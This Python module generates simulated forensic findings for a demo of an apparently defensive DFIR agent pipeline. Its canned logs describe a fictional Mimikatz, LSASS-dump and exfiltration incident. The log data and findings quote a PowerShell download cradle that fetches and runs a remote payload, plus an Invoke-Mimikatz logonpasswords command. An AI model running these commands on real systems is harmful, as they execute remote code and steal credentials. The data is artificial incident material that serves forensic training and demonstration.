"""Demo Data Generator

Generates realistic simulated forensic findings for demonstration purposes.
Allows the full agent pipeline to run without requiring SIFT Workstation tools.
"""

import json
import hashlib
from typing import Any, Dict, List
from datetime import datetime, timedelta
from pathlib import Path


# Simulated forensic output templates for each tool category
DEMO_OUTPUTS = {
    "volatility_processes": {
        "text": (
            "Volatility Foundation Volatility Framework 2.6.1\n"
            "PID    PPID   ImageFileName   Offset(Virtual)  UniqueId   HandleCount  ThreadCount  SessionId\n"
            "------ ------ --------------- ---------------- ---------- ------------ ------------ ----------\n"
            "4      0      System          0xfffffa800d4c8040  4          1247         78           0\n"
            "268    4      smss.exe        0xfffffa800db9e040  268        54           5            0\n"
            "344    328    csrss.exe       0xfffffa800db6fb30  344        743          13           0\n"
            "392    384    wininit.exe     0xfffffa800dc70b30  392        257          6            0\n"
            "504    496    services.exe    0xfffffa800dc9e540  504        1074         34           0\n"
            "576    504    svchost.exe     0xfffffa800e206540  576        875          23           0\n"
            "668    504    svchost.exe     0xfffffa800e2a4540  668        425          12           0\n"
            "780    504    svchost.exe     0xfffffa800e357540  780        1250         45           0\n"
            "892    504    svchost.exe     0xfffffa800e3fc540  892        312          8            0\n"
            "1024   504    spoolsv.exe     0xfffffa800e4a0540  1024       198          12           0\n"
            "1156   504    wmiprvse.exe    0xfffffa800e545040  1156       456          15           0\n"
            "1380   504    sqlservr.exe    0xfffffa800e600040  1380       892          28           0\n"
            "1456   504    cmd.exe         0xfffffa800e6ab040  1456       34           2            0\n"
            "1520   1456   powershell.exe  0xfffffa800e723040  1520       67           5            0\n"
            "1580   1520   conhost.exe     0xfffffa800e7a0040  1580       89           4            0\n"
            "1648   504   mimikatz.exe    0xfffffa800e81c040  1648       124          8            0\n"
            "1720   504   procdump.exe    0xfffffa800e896040  1720       45           3            0\n"
            "1800   504   net.exe         0xfffffa800e910040  1800       28           2            0\n"
            "1876   504   net1.exe        0xfffffa800e98a040  1876       22           1            0\n"
            "1952   504   whoami.exe      0xfffffa800ea04040  1952       18           1            0\n"
            "2028   504   systeminfo.exe  0xfffffa800ea7e040  2028       32           1            0\n"
            "2100   504   ipconfig.exe    0xfffffa800eaf8040  2100       26           1            0\n"
        ),
    },
    "volatility_network": {
        "text": (
            "Volatility Foundation Volatility Framework 2.6.1\n"
            "Offset          Proto    LocalAddress          ForeignAddress      State        PID   Owner\n"
            "---------------- -------- ---------------------- -------------------- ---------- ------ ------\n"
            "0xfffffa800e123456  TCPv4    192.168.1.100:49752    10.0.0.50:443       ESTABLISHED  1520  powershell.exe\n"
            "0xfffffa800e123460  TCPv4    192.168.1.100:49753    185.220.101.35:8443 ESTABLISHED  1648  mimikatz.exe\n"
            "0xfffffa800e123468  TCPv4    192.168.1.100:49754    91.219.237.1:443    ESTABLISHED  1720  procdump.exe\n"
            "0xfffffa800e123470  TCPv4    192.168.1.100:49760    192.168.1.1:53      TIME_WAIT    0     System\n"
            "0xfffffa800e123478  UDPv4    192.168.1.100:137      *:*                               4     System\n"
            "0xfffffa800e123480  UDPv4    192.168.1.100:138      *:*                               4     System\n"
            "0xfffffa800e123488  UDPv4    192.168.1.100:445      *:*                               4     System\n"
            "0xfffffa800e123490  TCPv4    192.168.1.100:445      192.168.1.200:49801 ESTABLISHED  4     System\n"
        ),
    },
    "volatility_dlls": {
        "text": (
            "Volatility Foundation Volatility Framework 2.6.1\n"
            "PID  Process        Base                Size    LoadCount  LoadTime                       Path\n"
            "---  -------        ----                ----    ---------  --------                       ----\n"
            "1648 mimikatz.exe   0x0000000071000000  102400  1          2026-06-14 08:15:32.000000     C:\\Users\\admin\\Desktop\\mimikatz.exe\n"
            "1648 mimikatz.exe   0x0000000072340000  8192    256        2026-06-14 08:15:32.100000     C:\\Windows\\System32\\advapi32.dll\n"
            "1648 mimikatz.exe   0x0000000072400000  4096    256        2026-06-14 08:15:32.200000     C:\\Windows\\System32\\crypt32.dll\n"
            "1648 mimikatz.exe   0x0000000072500000  8192    256        2026-06-14 08:15:32.300000     C:\\Windows\\System32\\samlib.dll\n"
            "1648 mimikatz.exe   0x0000000072600000  4096    256        2026-06-14 08:15:32.400000     C:\\Windows\\System32\\vaultcli.dll\n"
        ),
    },
    "volatility_handles": {
        "text": (
            "Volatility Foundation Volatility Framework 2.6.1\n"
            "PID  Process            Handle  Type               GrantedAccess  Name\n"
            "---  -------            ------  ----               -------------  ----\n"
            "1648 mimikatz.exe       0x1C    File               0x120189       \\Device\\HarddiskVolume2\\Windows\\System32\\config\\SAM\n"
            "1648 mimikatz.exe       0x24    File               0x120089       \\Device\\HarddiskVolume2\\Windows\\System32\\config\\SYSTEM\n"
            "1648 mimikatz.exe       0x38    Process            0x1F0FFF       System (PID: 4)\n"
            "1648 mimikatz.exe       0x4C    Section            0x1F001F       \\BaseNamedObjects\\SamApiPort\n"
        ),
    },
    "mft_timeline": {
        "json_output": [
            {"timestamp": "2026-06-14T08:10:15Z", "filename": "mimikatz.exe", "action": "FILE_CREATE", "path": "C:\\Users\\admin\\Desktop\\mimikatz.exe", "size": 1024000},
            {"timestamp": "2026-06-14T08:10:16Z", "filename": "procdump.exe", "action": "FILE_CREATE", "path": "C:\\Users\\admin\\Desktop\\procdump.exe", "size": 512000},
            {"timestamp": "2026-06-14T08:12:30Z", "filename": "lsass.dmp", "action": "FILE_CREATE", "path": "C:\\Users\\admin\\Desktop\\lsass.dmp", "size": 45678912},
            {"timestamp": "2026-06-14T08:15:45Z", "filename": "credentials.txt", "action": "FILE_CREATE", "path": "C:\\Users\\admin\\Desktop\\credentials.txt", "size": 2048},
            {"timestamp": "2026-06-14T08:20:00Z", "filename": "ransom_note.txt", "action": "FILE_CREATE", "path": "C:\\Users\\admin\\Documents\\ransom_note.txt", "size": 1024},
            {"timestamp": "2026-06-14T08:20:05Z", "filename": "encrypted_files.log", "action": "FILE_CREATE", "path": "C:\\Users\\admin\\Documents\\encrypted_files.log", "size": 65536},
        ],
    },
    "extract_amcache": {
        "json_output": [
            {"timestamp": "2026-06-14T08:10:12Z", "name": "mimikatz.exe", "path": "C:\\Users\\admin\\Desktop\\mimikatz.exe", "sha1": "a1b2c3d4e5f678901234", "size": 1024000},
            {"timestamp": "2026-06-14T08:10:14Z", "name": "procdump.exe", "path": "C:\\Users\\admin\\Desktop\\procdump.exe", "sha1": "b2c3d4e5f67890123456", "size": 512000},
            {"timestamp": "2026-06-14T08:15:30Z", "name": "cmd.exe", "path": "C:\\Windows\\System32\\cmd.exe", "sha1": "c3d4e5f6789012345678", "size": 327680},
            {"timestamp": "2026-06-14T08:15:31Z", "name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "sha1": "d4e5f678901234567890", "size": 552960},
            {"timestamp": "2026-06-14T08:20:01Z", "name": "net.exe", "path": "C:\\Windows\\System32\\net.exe", "sha1": "e5f67890123456789012", "size": 65536},
        ],
    },
    "extract_prefetch": {
        "json_output": [
            {"filename": "MIMIKATZ.EXE", "run_count": 3, "last_run": "2026-06-14T08:15:32Z", "volume": "\\Device\\HarddiskVolume2"},
            {"filename": "PROCDUMP.EXE", "run_count": 2, "last_run": "2026-06-14T08:12:28Z", "volume": "\\Device\\HarddiskVolume2"},
            {"filename": "CMD.EXE", "run_count": 47, "last_run": "2026-06-14T08:15:44Z", "volume": "\\Device\\HarddiskVolume2"},
            {"filename": "POWERSHELL.EXE", "run_count": 23, "last_run": "2026-06-14T08:15:33Z", "volume": "\\Device\\HarddiskVolume2"},
            {"filename": "NET.EXE", "run_count": 15, "last_run": "2026-06-14T08:22:10Z", "volume": "\\Device\\HarddiskVolume2"},
            {"filename": "SYSTEMINFO.EXE", "run_count": 1, "last_run": "2026-06-14T08:18:00Z", "volume": "\\Device\\HarddiskVolume2"},
            {"filename": "WHOAMI.EXE", "run_count": 1, "last_run": "2026-06-14T08:17:55Z", "volume": "\\Device\\HarddiskVolume2"},
        ],
    },
    "extract_registry": {
        "json_output": {
            "ComputerName": "CORP-WKS-042",
            "DomainName": "CORP.LOCAL",
            "ProductName": "Windows 10 Enterprise",
            "CurrentVersion": "10.0.19041",
            "InstallDate": "2025-01-15T09:30:00Z",
            "LastBootTime": "2026-06-14T07:55:00Z",
            "AutoRun": [
                {"key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "SecurityHealth", "data": "C:\\Windows\\System32\\SecurityHealthSystray.exe"},
            ],
        },
    },
    "extract_usn_journal": {
        "json_output": [
            {"timestamp": "2026-06-14T08:10:15Z", "filename": "mimikatz.exe", "reason": "FILE_CREATE", "source": "C:\\Users\\admin\\Desktop"},
            {"timestamp": "2026-06-14T08:10:16Z", "filename": "procdump.exe", "reason": "FILE_CREATE", "source": "C:\\Users\\admin\\Desktop"},
            {"timestamp": "2026-06-14T08:12:30Z", "filename": "lsass.dmp", "reason": "FILE_CREATE", "source": "C:\\Users\\admin\\Desktop"},
            {"timestamp": "2026-06-14T08:15:45Z", "filename": "credentials.txt", "reason": "FILE_CREATE", "source": "C:\\Users\\admin\\Desktop"},
        ],
    },
    "parse_event_logs": {
        "json_output": [
            {"event_id": 4688, "timestamp": "2026-06-14T08:15:30Z", "message": "A new process has been created: cmd.exe (PID: 1456)", "level": "Information", "channel": "Security"},
            {"event_id": 4688, "timestamp": "2026-06-14T08:15:31Z", "message": "A new process has been created: powershell.exe (PID: 1520)", "level": "Information", "channel": "Security"},
            {"event_id": 4688, "timestamp": "2026-06-14T08:15:32Z", "message": "A new process has been created: mimikatz.exe (PID: 1648)", "level": "Information", "channel": "Security"},
            {"event_id": 4688, "timestamp": "2026-06-14T08:15:33Z", "message": "A new process has been created: procdump.exe (PID: 1720)", "level": "Information", "channel": "Security"},
            {"event_id": 1102, "timestamp": "2026-06-14T08:25:00Z", "message": "The audit log was cleared", "level": "Warning", "channel": "Security"},
        ],
    },
    "parse_powershell_logs": {
        "json_output": [
            {"timestamp": "2026-06-14T08:15:33Z", "script_block_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890", "message": "Download cradle detected: IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.35/payload.ps1')"},
            {"timestamp": "2026-06-14T08:15:35Z", "script_block_id": "b2c3d4e5-f6a7-8901-bcde-f12345678901", "message": "Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'"},
            {"timestamp": "2026-06-14T08:15:40Z", "script_block_id": "c3d4e5f6-a7b8-9012-cdef-123456789012", "message": "Get-DomainUser -Identity administrator | ConvertTo-Json"},
            {"timestamp": "2026-06-14T08:18:00Z", "script_block_id": "d4e5f6a7-b8c9-0123-defa-234567890123", "message": "net group 'Domain Admins' /domain"},
        ],
    },
    "analyze_browser_history": {
        "json_output": [
            {"timestamp": "2026-06-14T08:00:00Z", "url": "https://github.com/gentilkiwi/mimikatz/releases", "title": "mimikatz releases", "browser": "chrome"},
            {"timestamp": "2026-06-14T08:05:00Z", "url": "https://docs.microsoft.com/en-us/windows/win32/secauthn/lsa-authentication", "title": "LSA Authentication", "browser": "chrome"},
            {"timestamp": "2026-06-14T08:08:00Z", "url": "https://www.google.com/search?q=how+to+dump+lsass+credentials", "title": "how to dump lsass credentials - Google Search", "browser": "chrome"},
        ],
    },
    "analyze_pcap": {
        "json_output": {
            "total_packets": 15234,
            "capture_time": {"start": "2026-06-14T08:00:00Z", "end": "2026-06-14T08:30:00Z"},
            "protocols": {"TCP": 12450, "UDP": 2100, "DNS": 580, "HTTP": 104, "TLS": 11800},
            "suspicious_connections": [
                {"src": "192.168.1.100", "dst": "185.220.101.35", "port": 8443, "protocol": "TCP", "bytes": 2457600, "flag": "C2 suspected"},
                {"src": "192.168.1.100", "dst": "91.219.237.1", "port": 443, "protocol": "TCP", "bytes": 10485760, "flag": "Data exfiltration suspected"},
            ],
        },
    },
    "extract_dns_from_pcap": {
        "text": (
            "2026-06-14 08:05:12  Standard query A 185.220.101.35.example.com\n"
            "2026-06-14 08:05:12  Standard query response A 185.220.101.35.example.com\n"
            "2026-06-14 08:10:22  Standard query A pastebin.com\n"
            "2026-06-14 08:10:22  Standard query response A 104.16.248.249\n"
            "2026-06-14 08:15:33  Standard query A 91.219.237.1\n"
            "2026-06-14 08:15:33  Standard query response A 91.219.237.1\n"
            "2026-06-14 08:16:00  Standard query A evil-c2-server.example.com\n"
            "2026-06-14 08:16:00  Standard query response A 185.220.101.35\n"
        ),
    },
    "extract_http_from_pcap": {
        "json_output": [
            {"timestamp": "2026-06-14T08:15:33Z", "method": "GET", "uri": "/payload.ps1", "host": "185.220.101.35", "status": 200, "user_agent": "Mozilla/5.0"},
            {"timestamp": "2026-06-14T08:20:00Z", "method": "POST", "uri": "/upload", "host": "91.219.237.1", "status": 200, "content_length": 10485760, "user_agent": "Mozilla/5.0"},
            {"timestamp": "2026-06-14T08:22:00Z", "method": "GET", "uri": "/check-in?id=CORP-WKS-042", "host": "185.220.101.35", "status": 200, "user_agent": "Mozilla/5.0"},
        ],
    },
    "create_super_timeline": {
        "text": (
            "Plaso (log2timeline) version 20231120\n"
            "Storage file: /output/timeline.plaso\n"
            "Parsing started\n"
            "Processing completed: 45234 events processed\n"
            "Timeline range: 2026-06-14 07:55:00 to 2026-06-14 08:30:00\n"
            "Sources: MFT, Registry, Event Logs, Prefetch, Amcache, USN Journal\n"
        ),
    },
    "query_timeline": {
        "json_output": [
            {"timestamp": "2026-06-14T08:10:15Z", "source": "MFT", "event": "File created: mimikatz.exe"},
            {"timestamp": "2026-06-14T08:10:16Z", "source": "MFT", "event": "File created: procdump.exe"},
            {"timestamp": "2026-06-14T08:12:30Z", "source": "MFT", "event": "File created: lsass.dmp"},
            {"timestamp": "2026-06-14T08:15:30Z", "source": "Prefetch", "event": "Process executed: cmd.exe"},
            {"timestamp": "2026-06-14T08:15:31Z", "source": "Prefetch", "event": "Process executed: powershell.exe"},
            {"timestamp": "2026-06-14T08:15:32Z", "source": "Prefetch", "event": "Process executed: mimikatz.exe"},
            {"timestamp": "2026-06-14T08:25:00Z", "source": "Event Log", "event": "Audit log cleared"},
        ],
    },
    "bulk_extract": {
        "text": (
            "bulk_extractor version 1.6.0\n"
            "Scanning input file...\n"
            "Email addresses found: 3\n"
            "  - admin@corp.local\n"
            "  - attacker@evil.com\n"
            "  - noreply@microsoft.com\n"
            "IP addresses found: 4\n"
            "  - 192.168.1.100 (internal)\n"
            "  - 185.220.101.35 (external - suspicious)\n"
            "  - 91.219.237.1 (external - suspicious)\n"
            "  - 104.16.248.249 (external)\n"
            "URLs found: 5\n"
            "  - http://185.220.101.35/payload.ps1\n"
            "  - https://github.com/gentilkiwi/mimikatz/releases\n"
            "  - https://pastebin.com/abc123\n"
        ),
    },
    "calculate_file_hash": {
        "text": "a3f5b8c2d4e6f7890123456789abcdef  memory.raw\n",
    },
    "get_system_info": {
        "text": (
            "Computer Name: CORP-WKS-042\n"
            "Domain: CORP.LOCAL\n"
            "OS: Windows 10 Enterprise (Build 19041)\n"
            "Install Date: 2025-01-15\n"
            "Last Boot: 2026-06-14 07:55:00\n"
            "Timezone: Eastern Standard Time\n"
        ),
    },
}


class DemoDataGenerator:
    """Generates realistic simulated forensic findings for demo mode."""

    def __init__(self, evidence_path: str):
        self.evidence_path = Path(evidence_path)
        self.tool_call_count = 0

    def get_demo_output(self, tool_name: str, arguments: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate simulated output for a forensic tool.

        Returns a dict matching the structure the MCP server would return.
        """
        self.tool_call_count += 1

        demo_data = DEMO_OUTPUTS.get(tool_name)
        if not demo_data:
            return {
                "success": False,
                "error": f"No demo data available for tool: {tool_name}",
                "metadata": {
                    "execution_id": f"demo_{tool_name}_{self.tool_call_count}",
                    "tool": tool_name,
                    "demo_mode": True,
                },
            }

        # Determine output format
        if "json_output" in demo_data:
            output = demo_data["json_output"]
        elif "text" in demo_data:
            output = {"text": demo_data["text"]}
        else:
            output = demo_data

        # Compute a fake output hash for integrity tracking
        output_str = json.dumps(output, sort_keys=True, default=str)
        output_hash = hashlib.sha256(output_str.encode()).hexdigest()

        return {
            "success": True,
            "output": output,
            "metadata": {
                "execution_id": f"demo_{tool_name}_{self.tool_call_count}",
                "tool": tool_name,
                "command": f"[DEMO] {tool_name} (simulated)",
                "execution_time_seconds": 0.05 + (self.tool_call_count * 0.01),
                "return_code": 0,
                "output_hash": output_hash,
                "demo_mode": True,
            },
            "raw_output_available": True,
            "truncated": False,
        }

    def get_demo_findings(self) -> List[Dict[str, Any]]:
        """Return a list of pre-built findings for the demo scenario."""
        base_time = datetime(2026, 6, 14, 8, 10, 0)

        return [
            {
                "category": "suspicious_process",
                "severity": "high",
                "description": "Detected Mimikatz credential dumping tool in memory (PID: 1648)",
                "evidence_source": "volatility_processes",
                "confidence": 0.95,
                "raw_evidence": "mimikatz.exe PID:1648 CMD:1456 SESSION:0",
                "timestamp": (base_time + timedelta(minutes=5)).isoformat(),
            },
            {
                "category": "suspicious_process",
                "severity": "high",
                "description": "Detected ProCDump process dumping tool targeting LSASS (PID: 1720)",
                "evidence_source": "volatility_processes",
                "confidence": 0.90,
                "raw_evidence": "procdump.exe PID:1720 CMD:504 SESSION:0",
                "timestamp": (base_time + timedelta(minutes=5, seconds=30)).isoformat(),
            },
            {
                "category": "network_activity",
                "severity": "high",
                "description": "Suspicious C2 communication to 185.220.101.35:8443 from mimikatz.exe",
                "evidence_source": "volatility_network",
                "confidence": 0.85,
                "raw_evidence": "TCP 192.168.1.100:49753 -> 185.220.101.35:8443 ESTABLISHED mimikatz.exe",
                "timestamp": (base_time + timedelta(minutes=6)).isoformat(),
            },
            {
                "category": "network_activity",
                "severity": "high",
                "description": "Potential data exfiltration to 91.219.237.1:443 (10.5 MB transferred)",
                "evidence_source": "volatility_network",
                "confidence": 0.80,
                "raw_evidence": "TCP 192.168.1.100:49754 -> 91.219.237.1:443 ESTABLISHED procdump.exe",
                "timestamp": (base_time + timedelta(minutes=10)).isoformat(),
            },
            {
                "category": "file_system_activity",
                "severity": "high",
                "description": "Mimikatz executable dropped on Desktop at 08:10:15",
                "evidence_source": "mft_timeline",
                "confidence": 0.95,
                "raw_evidence": "FILE_CREATE C:\\Users\\admin\\Desktop\\mimikatz.exe size:1024000",
                "timestamp": (base_time + timedelta(minutes=1)).isoformat(),
            },
            {
                "category": "file_system_activity",
                "severity": "high",
                "description": "LSASS memory dump created (43.6 MB) - credential dumping confirmed",
                "evidence_source": "mft_timeline",
                "confidence": 0.92,
                "raw_evidence": "FILE_CREATE C:\\Users\\admin\\Desktop\\lsass.dmp size:45678912",
                "timestamp": (base_time + timedelta(minutes=2, seconds=30)).isoformat(),
            },
            {
                "category": "application_execution",
                "severity": "medium",
                "description": "Mimikatz executed 3 times, last run at 08:15:32",
                "evidence_source": "extract_prefetch",
                "confidence": 0.88,
                "raw_evidence": "MIMIKATZ.EXE run_count:3 last_run:2026-06-14T08:15:32Z",
                "timestamp": (base_time + timedelta(minutes=5, seconds=32)).isoformat(),
            },
            {
                "category": "powershell_activity",
                "severity": "high",
                "description": "PowerShell download cradle detected - fetching payload from C2 server",
                "evidence_source": "parse_powershell_logs",
                "confidence": 0.93,
                "raw_evidence": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.35/payload.ps1')",
                "timestamp": (base_time + timedelta(minutes=5, seconds=33)).isoformat(),
            },
            {
                "category": "powershell_activity",
                "severity": "high",
                "description": "Invoke-Mimikatz invoked via PowerShell - credential theft attempt",
                "evidence_source": "parse_powershell_logs",
                "confidence": 0.94,
                "raw_evidence": "Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'",
                "timestamp": (base_time + timedelta(minutes=5, seconds=35)).isoformat(),
            },
            {
                "category": "dns_activity",
                "severity": "medium",
                "description": "DNS resolution for suspicious C2 domain: evil-c2-server.example.com",
                "evidence_source": "extract_dns_from_pcap",
                "confidence": 0.82,
                "raw_evidence": "Standard query A evil-c2-server.example.com -> 185.220.101.35",
                "timestamp": (base_time + timedelta(minutes=16)).isoformat(),
            },
            {
                "category": "system_events",
                "severity": "high",
                "description": "Security audit log cleared at 08:25:00 - anti-forensics detected",
                "evidence_source": "parse_event_logs",
                "confidence": 0.98,
                "raw_evidence": "Event ID 1102: The audit log was cleared",
                "timestamp": (base_time + timedelta(minutes=25)).isoformat(),
            },
            {
                "category": "system_events",
                "severity": "medium",
                "description": "Suspicious process chain: cmd.exe -> powershell.exe -> mimikatz.exe",
                "evidence_source": "parse_event_logs",
                "confidence": 0.87,
                "raw_evidence": "Event ID 4688: mimikatz.exe (PID:1648) created by cmd.exe (PID:1456)",
                "timestamp": (base_time + timedelta(minutes=5, seconds=30)).isoformat(),
            },
            {
                "category": "http_activity",
                "severity": "high",
                "description": "PowerShell payload download via HTTP GET from C2 server",
                "evidence_source": "extract_http_from_pcap",
                "confidence": 0.91,
                "raw_evidence": "GET /payload.ps1 from 185.220.101.35 -> 200 OK",
                "timestamp": (base_time + timedelta(minutes=5, seconds=33)).isoformat(),
            },
            {
                "category": "http_activity",
                "severity": "high",
                "description": "Data exfiltration via HTTP POST (10.5 MB uploaded to C2)",
                "evidence_source": "extract_http_from_pcap",
                "confidence": 0.86,
                "raw_evidence": "POST /upload to 91.219.237.1 -> 200 OK content_length:10485760",
                "timestamp": (base_time + timedelta(minutes=20)).isoformat(),
            },
        ]
